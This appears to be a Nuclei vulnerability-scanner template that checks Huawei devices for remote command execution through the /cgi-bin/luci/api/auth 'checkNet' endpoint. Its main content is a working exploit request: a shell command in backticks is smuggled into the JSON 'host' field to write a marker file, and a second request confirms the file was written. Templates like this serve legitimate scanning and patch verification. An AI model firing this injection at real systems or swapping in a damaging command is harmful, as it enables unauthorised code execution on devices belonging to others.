id: huawei-auth-http-server-file-rce
 
info:
  name: huawei-auth-http-server-file-rce
  author: huawei
  severity: high

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"
  
http:
  - raw:
      - |
        @timeout: 5s
        POST /cgi-bin/luci/api/auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
 
        {"method":"checkNet","params":{"host":"`echo sectest2026>{{filename}}.txt`"}}
 
 
      - |
        @timeout: 5s
        GET /cgi-bin/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
 
 
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"sectest2026")